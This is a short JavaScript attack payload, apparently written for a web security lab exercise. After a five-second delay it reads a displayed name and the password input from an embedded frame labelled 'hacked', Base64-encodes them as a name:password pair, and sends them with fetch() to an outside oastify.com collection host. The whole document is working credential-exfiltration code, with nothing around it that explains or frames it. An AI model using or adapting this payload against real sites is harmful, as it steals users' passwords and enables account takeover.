setTimeout(run, 5000);
function run() {
  let n = document.evaluate('//h5[@class="ap-nameAddress__title"]',
document.getElementById("hacked").contentWindow.document, null, XPathResult.FIRST_ORDERED_NODE_TYPE,
null).singleNodeValue.textContent;
  let p = document.evaluate('//input[@name="password"]',
document.getElementById("hacked").contentWindow.document, null, XPathResult.FIRST_ORDERED_NODE_TYPE,
null).singleNodeValue.value;
  fetch("https://q900c9zery18t2vsyg7e02140v6mudi2.oastify.com" + "?" + encodeURI(btoa(n+":"+p)));
}
